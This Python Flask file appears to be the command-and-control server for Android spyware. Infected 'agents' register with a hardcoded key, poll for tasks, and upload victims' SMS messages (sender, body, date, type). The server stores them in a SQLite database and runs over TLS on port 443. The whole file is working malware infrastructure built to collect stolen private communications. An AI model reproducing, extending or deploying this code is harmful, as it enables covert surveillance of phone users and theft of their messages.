from flask import Flask, request, jsonify
from string import ascii_uppercase
from random import choice
import os
import sqlite3
import main
from sqlite3 import Error


app = Flask(__name__)
db_file = "database.db"

##########
# Routes #
##########

@app.route("/")
def hello():
    return "Hello World!"

@app.route("/updog", methods=['GET'])
def updog():
    return ("Whats Up Dog", 200)

@app.route("/reg", methods=['POST'])
def registerAgent():
    """
    Register an agent
    - generate uid
    - add agent to database
    - Respond 200 with the uid
    """
    content = request.get_json(silent=True)
    # print(content) # Do your processing

    if (content.get("key", '') == "Potato"):
        agentId = ''.join(choice(ascii_uppercase) for i in range(6))
        print(f"New agent: {agentId}")

        # Add to active agents
        main.active_agents.append(agentId)

        # Add to database
        sql = "INSERT INTO agents VALUES (?)"
        args = (agentId, )
        writeToDatabase(sql, args)

        return (agentId, 200)
    else:
        return ("\n", 204)
    
@app.route("/task/<id>", methods=['GET'])
def getTask(id):
    if id in main.active_agents:
        if os.path.exists(f"task/{id}"):
            
            with open(f"task/{id}", "r") as f:
                task = f.read()
            
            return(task, 200)
        else:
            return ("\n", 201)
    else:
        return ("\n", 204)

@app.route("/result/<id>", methods=['POST'])
def receiveResult(id):
    if id in main.active_agents:
        content = request.get_json(silent=True)
        print(content) # Do your processing

        code = content["code"]
        if code == "sms":
            return handle_sms(content["data"], id)
        
    else:
        return ("\n", 204)

####################
# Command Handlers #
####################

def handle_sms(content, id):
    print(f"Received SMS data: {content}\n\n")
    for json_data in content:
        try:
            address = json_data["address"]
            body = json_data["body"]
            formatted_date = json_data["formatted_date"]
            messageType = json_data["type"]
        except:
            print("[-] Corrupted json data: ", json_data)

        # Save data to database
        sql = "INSERT INTO sms VALUES (?, ?, ?, ?, ?)"
        args = (id, address, body, formatted_date, messageType)
        writeToDatabase(sql, args)
               
    clearAgentTasks(id)

    return ("Success", 200)
    # content_length = int(self.headers['Content-Length'])
    #     body = self.rfile.read(content_length)

    #     # If POST request body starts with b'{"messages\:', it means an incoming JSON object containing all SMS messages is coming.
    #     if body.startswith(b'{"messages":'):
    #         json_data = json.loads(body.decode())
    # [{'address': '6505551212', 'body': 'Android is always a sweet treat!', 'formatted_date': '06/01/2023 15:26:16', 'type': '1'}, 
    # {'address': '5551234', 'body': 'Hello Android', 'formatted_date': '06/01/2023 14:28:26', 'type': '1'}]
            
    #         dir = "sms"
    #         if not os.path.exists(dir):
    #             os.makedirs(dir)

            
    #         for message in json_data['messages']:
    #             print(message) # Print all json_data

    #             # Save all json data
    #             with open("sms/sms_data.json", "a+") as outfile:
    #                 json.dump(message, outfile)
    #                 outfile.write("\n")
                

    #         self.send_response(200)
    #         self.end_headers()
    #         self.wfile.write(b'Success')

####################
# Helper functions #
####################

def clearAgentTasks(id):
    taskFile = f"task/{id}"

    if os.path.exists(taskFile):
        os.remove(taskFile)
    else:
        print(f"[-] No such file found: {taskFile}")

def writeToDatabase(sql, args):
    try:
        conn = sqlite3.connect(db_file)
        conn.execute(sql, args)
        conn.commit()
    except Error as e:
        print(e)
    finally:
        if conn:
            conn.close()

def readFromDatabase(sql, args):
    try:
        conn = sqlite3.connect(db_file)
        rows = conn.execute(sql, args).fetchall()
        if rows.__len__ != 0:
            return rows
        else:
            return None
    except Error as e:
        print(e)
    finally:
        if conn:
            conn.close()

def init_database():
    print("Creating database")
    try:
        conn = sqlite3.connect(db_file)
        sql = "CREATE TABLE IF NOT EXISTS agents(id TEXT)"
        conn.execute(sql)

        sql = "CREATE TABLE IF NOT EXISTS sms(id TEXT, address TEXT, body TEXT, formatted_date TEXT, type INT)"
        conn.execute(sql)
        conn.commit()
    except Error as e:
        print(e)
    finally:
        if conn:
            conn.close()

def run_server():
    init_database()
    import logging
    logging.basicConfig(filename='log',level=logging.DEBUG)

    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key2.pem'))

if __name__ == "__main__":
    run_server()